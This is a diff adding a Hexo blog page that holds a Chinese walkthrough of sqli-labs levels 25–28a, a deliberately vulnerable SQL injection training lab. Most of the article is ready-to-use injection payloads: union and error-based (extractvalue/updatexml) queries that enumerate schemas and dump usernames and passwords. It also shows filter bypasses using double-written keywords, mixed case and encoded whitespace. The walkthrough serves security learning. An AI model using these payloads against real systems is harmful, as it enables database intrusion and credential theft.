@@ -1,0 +1,227 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>sql-25-28 | 风不及你甜</title><meta name="author" content="wdraemv"><meta name="copyright" content="wdraemv"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Less-25基于错误-您所有的OR＆AND都属于我们-字符串单引号 翻译： 注意：未定义变量：在第81行的C：\ phpStudy \ WWW \ sqli \ Less-25 \ index.php中提示提示：将使用以下结果过滤您的输入： 一上来就有报错与提示信息。  有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：若是一次性的，且只是将过滤字符换成了空字符： 双写绕过—— or&#x3D;oo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql-25-28">
+<meta property="og:url" content="http://example.com/2021/02/04/sql-26-28/index.html">
+<meta property="og:site_name" content="风不及你甜">
+<meta property="og:description" content="Less-25基于错误-您所有的OR＆AND都属于我们-字符串单引号 翻译： 注意：未定义变量：在第81行的C：\ phpStudy \ WWW \ sqli \ Less-25 \ index.php中提示提示：将使用以下结果过滤您的输入： 一上来就有报错与提示信息。  有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：若是一次性的，且只是将过滤字符换成了空字符： 双写绕过—— or&#x3D;oo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-02-04T07:40:05.000Z">
+<meta property="article:modified_time" content="2021-02-04T08:22:40.000Z">
+<meta property="article:author" content="wdraemv">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/04/sql-26-28/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-04 16:22:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="风不及你甜" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/-%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 清单|| fa fa-heartbeat</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">风不及你甜</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/-%E9%9F%B3%E4%B9%90"><i class="fa-fw /music/"></i><span> 清单|| fa fa-heartbeat</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql-25-28</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-04T07:40:05.000Z" title="Created 2021-02-04 15:40:05">2021-02-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-02-04T08:22:40.000Z" title="Updated 2021-02-04 16:22:40">2021-02-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1><h3 id="基于错误-您所有的OR＆AND都属于我们-字符串单引号"><a href="#基于错误-您所有的OR＆AND都属于我们-字符串单引号" class="headerlink" title="基于错误-您所有的OR＆AND都属于我们-字符串单引号"></a>基于错误-您所有的OR＆AND都属于我们-字符串单引号</h3><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY2fLGVeaL0Qs3IJB5xVfJUibRT1Ek15gYy2ttzLJifaZh2IELVf4UsRBB0q7hhTg2w!/b&bo=lQa5AwAAAAADR0s!&rf=viewer_4" alt="img"></p>
+<p>翻译：</p>
+<p>注意：未定义变量：在第81行的C：\ phpStudy \ WWW \ sqli \ Less-25 \ index.php中提示<br>提示：将使用以下结果过滤您的输入：</p>
+<p>一上来就有报错与提示信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200421221328936.png" alt="img"></p>
+<h4 id="有过滤的时候首先要判断这个过滤是一次性的还是非一次性的："><a href="#有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：" class="headerlink" title="有过滤的时候首先要判断这个过滤是一次性的还是非一次性的："></a>有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：</h4><p><strong>若是一次性的，且只是将过滤字符换成了空字符：</strong></p>
+<p><strong>双写绕过—— or=oorr、and=anandd</strong></p>
+<h4 id="若是非一次性的，就要考虑一些变形："><a href="#若是非一次性的，就要考虑一些变形：" class="headerlink" title="若是非一次性的，就要考虑一些变形："></a>若是非一次性的，就要考虑一些变形：</h4><p><strong>大小写变形绕过—— or=Or=oR=OR</strong><br><strong>利用运算符——   or=||、and=&amp;&amp;</strong><br><strong>URL编码绕过——  #=%23，Hex编码—— ~=0x7e</strong><br><strong>添加注释  ——  /<em>or</em>/</strong></p>
+<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><h3 id="暴字段："><a href="#暴字段：" class="headerlink" title="暴字段："></a>暴字段：</h3><p><strong>?id=1’ oorrder by 3– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY0SMJGvbFIWVwsmhe65hNerpupZBNBULj0J92or1.Ism3.6XDAUyzOiWcymiQ2CzdM!/b&bo=mgYGAwAAAAADN4s!&rf=viewer_4" alt="img"></p>
+<p><strong>?id=-1’ union select 1,2,3– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcU1gIesnf*U*4pgdUv3XgY2.v344gRA16jjjltSHXtJgzelv23QOpvKTVX94CffTIE86swLcag7l0v1Ih7EGo5o!/b&bo=rgYfAwAAAAADN6Y!&rf=viewer_4" alt="img"></p>
+<h3 id="暴库："><a href="#暴库：" class="headerlink" title="暴库："></a>暴库：</h3><p><strong>?id=-1’ union select 1,user(),database()– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h2*Jp1yKUmcGIa6lISdB3ncHYaI.rVViY7MbuoxPBFl32ARa.ce7JeAg*ZEW7sKH2A!/b&bo=IwffAgAAAAADN.s!&rf=viewer_4" alt="img"></p>
+<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p><strong>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h2lrRTacE1boIT9Tb86rm3VCjTS4Gsy4z2s29LB2PbJ.Q.b7aLiW5VR8EGzKVAmfyQ!/b&bo=.AbiAgAAAAADNww!&rf=viewer_4" alt="img"></p>
+<h3 id="爆字段："><a href="#爆字段：" class="headerlink" title="爆字段："></a>爆字段：</h3><p><strong>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema=’security’ anandd table_name=’users’),3– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h1MPzUtGZ0hstgdW4AMtGIQ06FCrmQ*2ntbkrl37yhYi45KpR*2DRFOQrQBHeI92tg!/b&bo=6wblAgAAAAADNxg!&rf=viewer_4" alt="img"></p>
+<h3 id="爆数据："><a href="#爆数据：" class="headerlink" title="爆数据："></a>爆数据：</h3><p><strong>?id=-1’ union select 1,(select group_concat(concat_ws(‘-‘,id,username,passwoorrd)) from users),3– #</strong></p>
+<p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcZPwz.H1vycN05SNQMon5h1cl0YLpThfHmjXMxacpn1ua17x1i3g9Ph9BtPDZ4nm4ml3mi6.ReIN0X*GHAWy3HY!/b&bo=YwehAgAAAAADN9U!&rf=viewer_4" alt="img"></p>
+<h2 id="运算符绕过"><a href="#运算符绕过" class="headerlink" title="运算符绕过"></a>运算符绕过</h2><p><strong>?id=-1’ || extractvalue(1,concat(0x7e,database()))– #</strong></p>
+<p>或者</p>
+<p><strong>?id=1’ || extractvalue(1,concat(0x7e,database()))– #</strong>   都是一样的，理解or和函数extractvalue在一起的作用就会明白这两种写法都对。</p>
+<h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><h3 id="基于Bool-GET-过滤AND-OR-数字型-盲注"><a href="#基于Bool-GET-过滤AND-OR-数字型-盲注" class="headerlink" title="基于Bool_GET_过滤AND/OR_数字型_盲注"></a>基于Bool_GET_过滤AND/OR_数字型_盲注</h3><p>本关与Less-25十分相似，既可以正常union注入也可以用脚本Bool或Time盲注。但却不能报错注入</p>
+<p><strong>原因在于没有输出错误项，即关闭了错误报告。</strong></p>
+<p>不在重复</p>
+<h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><h3 id="GET-基于错误-您所有的空格和注释都属于我们"><a href="#GET-基于错误-您所有的空格和注释都属于我们" class="headerlink" title="GET-基于错误-您所有的空格和注释都属于我们"></a>GET-基于错误-您所有的空格和注释都属于我们</h3><p>根据提示我们知道这一关过滤了空格和注释，实际上过滤的远远不止这些，我们来看下源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/20200425101208867.png" alt="img"></p>
+<p>可以确认一下：</p>
+<p>　　　　<strong>?id=%231　　//确认过滤了#</strong></p>
+<p>　　　　<strong>?id=or1　　//确认过滤了or</strong></p>
+<p>　　　　*<em>?id=/<em>1　　//确认过滤了多行注释</em></em>　　</p>
+<p>　　　　<strong>?id=–1　　//确认过滤了单行注释</strong></p>
+<p>　　　　<strong>?id=/1　　//确认过滤了斜杠</strong></p>
+<p>　　　　<strong>?id=1’ ‘ ‘　　//确认过滤了空格，报错注入才行</strong></p>
+<p>　　　　<strong>?id=\　　//确认过滤了反斜杠</strong></p>
+<h3 id="暴库：-1"><a href="#暴库：-1" class="headerlink" title="暴库："></a>暴库：</h3><p>（注：url编码%26是运算符&amp;，下面的%26%26换成运算符||也是可以的，但不能直接用&amp;&amp;，会报错，原理还不清楚，但使用&amp;的url编码%26就不会报错）</p>
+<p><strong>?id=’%0bunion%0bselect%0b1,database(),3%26%26’7’=’7</strong></p>
+<h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>id=’union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=’security’%26%26%0b’7’=’7</p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>id=’union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=’security’%0baandnd%0btable_name=’users’%26%26%0b’7’=’7</p>
+<h3 id="爆数据：-1"><a href="#爆数据：-1" class="headerlink" title="爆数据："></a>爆数据：</h3><p>id=’union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b’7’=’7</p>
+<h2 id="用updatexml函数"><a href="#用updatexml函数" class="headerlink" title="用updatexml函数"></a>用updatexml函数</h2><p>爆数据库：</p>
+<p>?id=’||updatexml(1,concat(‘$’,(database())),0)||’1’=’1</p>
+<p>爆表：</p>
+<p>?id=’||updatexml(1,concat(‘$’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),0)||’1’=’1</p>
+<p>爆字段：</p>
+<p>?id=’||updatexml(1,concat(‘$’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=’security’)%26%26(table_name=’users’))),0)||’1’=’1</p>
+<p>爆数据：</p>
+<p>?id=’||updatexml(1,concat(‘$’,(select(concat(‘$’,id,’$’,username,’$’,passwoorrd))from(users)limit%0b0,1)),0)||’1’=’1</p>
+<h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><h3 id="基于错误-GET-过滤空格-注释-单引号-小括号-字符型-盲注"><a href="#基于错误-GET-过滤空格-注释-单引号-小括号-字符型-盲注" class="headerlink" title="基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注"></a>基于错误_GET_过滤空格/注释_单引号_小括号_字符型_盲注</h3><p><img src="https://img-blog.csdnimg.cn/20200425194231463.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200425194300910.png" alt="img"></p>
+<p>这关与 26 的区别在于，sql 语句添加了一个括号，同时在 sql 语句执行抛出错误后并不在前台页面输出。所有我们排除报错注入，这里依旧是利用 union 注入，布尔盲注，延时注入。</p>
+<p>?id=1’        报错，可初步得出是单引号字符型注入</p>
+<p>?id=1’||’ 和?id=1’||1’ 会让我们误判为就是单引号字符型注入，因为带入源码中id=(‘1’||’’)和id=(‘1’||’1’)返回的结果都会是id=1 所以可以使用下面的语句来快速判断是否带有一个小括号，或者用前面讲的判断是否有小括号的方法也是一样的。</p>
+<p>?id=1’)||(‘           (因为我们过滤了注释，使用这种可以很快的判断出是否是带一个括号的注入点)</p>
+<p>暴库：</p>
+<p>?id=’)%0bunion%0bselect%0b1,database(),3%0b||(‘1’)=(‘1</p>
+<p>简写点：</p>
+<p>?id=’)%0bunion%0bselect%0b1,database(),3%0b||1=(‘1</p>
+<p>爆表：</p>
+<p>id=’)%0bunion%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=’security’%26%261=(‘1</p>
+<p>爆字段：</p>
+<p>id=’)%0bunion%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=’security’%0baandnd%0btable_name=’users’%26%261=(‘1</p>
+<p>爆数据：</p>
+<p>id=’)%0bunion%0bselect%0b1,group_concat(passwoorrd,0x7e,username),3%0bfrom%0busers%0bwhere%0b1=(‘1</p>
+<h1 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h1><h3 id="基于错误-GET-过滤UNION-SELECT-单引号-字符型注入"><a href="#基于错误-GET-过滤UNION-SELECT-单引号-字符型注入" class="headerlink" title="基于错误_GET_过滤UNION/SELECT_单引号_字符型注入"></a>基于错误_GET_过滤UNION/SELECT_单引号_字符型注入</h3><p>先判断注入类型，发现是单引号字符型注入</p>
+<p><img src="https://img-blog.csdnimg.cn/20200426225124835.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p>发现没有过滤or与and，过滤了几个大小写的union和select但是可以用随机大小写绕过，过滤了–、#以及/**/，过滤了两次空格，过滤了/但没过滤\。<br>所以实际上只过滤了注释与空格，与 Less 26 相似。</p>
+<h3 id="直接大小写混合绕过即可"><a href="#直接大小写混合绕过即可" class="headerlink" title="直接大小写混合绕过即可"></a>直接大小写混合绕过即可</h3><p>暴库：</p>
+<p>?id=0’/<em>%0a</em>/UnIoN/<em>%0a</em>/SeLeCt/<em>%0a</em>/1,database(),2/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1</p>
+<p>爆表：</p>
+<p>?id=0’%0aUnIoN%0aSeLeCt%0a1，(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=’security’),3||’1</p>
+<p>爆字段：</p>
+<p>?id=0’%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=’security’%0bAnd%0btable_name=’users’%0b%26%26%0b’1’=’1</p>
+<p>爆数据：</p>
+<p>?id=0’/<em>%0a</em>/UnIoN/<em>%0a</em>/SeLeCt/<em>%0a</em>/1,(SeLeCt/<em>%0a</em>/group_concat(concat_ws(‘$’,id,username,password))/<em>%0a</em>/from/<em>%0a</em>/users),3/<em>%0a</em>/||/<em>%0a</em>/‘1’=’1</p>
+<h1 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1><h3 id="基于盲注-GET-过滤UNION-SELECT-双引号-字符型"><a href="#基于盲注-GET-过滤UNION-SELECT-双引号-字符型" class="headerlink" title="基于盲注_GET_过滤UNION/SELECT_双引号_字符型"></a>基于盲注_GET_过滤UNION/SELECT_双引号_字符型</h3><p><img src="https://img-blog.csdnimg.cn/20200426234530920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTkzNDUyMA==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200426234557986.png" alt="img"></p>
+<p><img src="https://img-blog.csdnimg.cn/20200426234504109.png" alt="img"></p>
+<p>双引号字符型注入<br>没有错误回显，不能进行报错注入，即无法使用updatexml函数等，但可以进行布尔盲注，因为他有无错误回显，即正确和错误页面返回的页面不同。<br>可以使用union联合注入，延时盲注。</p>
+<h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><h3 id="基于错误的，单引号字符型，过滤了union和select等的注入"><a href="#基于错误的，单引号字符型，过滤了union和select等的注入" class="headerlink" title="基于错误的，单引号字符型，过滤了union和select等的注入"></a>基于错误的，单引号字符型，过滤了union和select等的注入</h3><p><img src="https://img-blog.csdnimg.cn/20200427230419929.png" alt="img"></p>
+<p><strong>发现没有过滤or与and。</strong><br><strong>过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、空格等，使用%a0等空格的URL编码可以绕过。</strong><br><strong>过滤了–、#以及/</strong>/。**<br><strong>过滤了两次空格。</strong><br><strong>过滤了/但没过滤\。</strong></p>
+<p>这一关和Less-27a十分相似，可以利用联合注入，布尔盲注，延时注入。</p>
+<h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><h3 id="基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"><a href="#基于盲注的，带括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="基于盲注的，带括号的单引号字符型，过滤了union和select等的注入"></a>基于盲注的，带括号的单引号字符型，过滤了union和select等的注入</h3><p><strong>本关与 28 基本一致，只是过滤条件少了几个。</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20200427233353774.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">wdraemv</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/04/sql-26-28/">http://example.com/2021/02/04/sql-26-28/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/08/sql-29-30-31/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">sqlilabs-29,30,31</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/27/sql-23/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">sql-23</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">wdraemv</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25"><span class="toc-number">1.</span> <span class="toc-text">Less-25</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF-%E6%82%A8%E6%89%80%E6%9C%89%E7%9A%84OR%EF%BC%86AND%E9%83%BD%E5%B1%9E%E4%BA%8E%E6%88%91%E4%BB%AC-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">1.0.1.</span> <span class="toc-text">基于错误-您所有的OR＆AND都属于我们-字符串单引号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84%E6%97%B6%E5%80%99%E9%A6%96%E5%85%88%E8%A6%81%E5%88%A4%E6%96%AD%E8%BF%99%E4%B8%AA%E8%BF%87%E6%BB%A4%E6%98%AF%E4%B8%80%E6%AC%A1%E6%80%A7%E7%9A%84%E8%BF%98%E6%98%AF%E9%9D%9E%E4%B8%80%E6%AC%A1%E6%80%A7%E7%9A%84%EF%BC%9A"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">有过滤的时候首先要判断这个过滤是一次性的还是非一次性的：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8B%A5%E6%98%AF%E9%9D%9E%E4%B8%80%E6%AC%A1%E6%80%A7%E7%9A%84%EF%BC%8C%E5%B0%B1%E8%A6%81%E8%80%83%E8%99%91%E4%B8%80%E4%BA%9B%E5%8F%98%E5%BD%A2%EF%BC%9A"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">若是非一次性的，就要考虑一些变形：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">双写绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%AD%97%E6%AE%B5%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">暴字段：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%BA%93%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">暴库：</span></a></li><li class="toc-item toc-level-3"><a 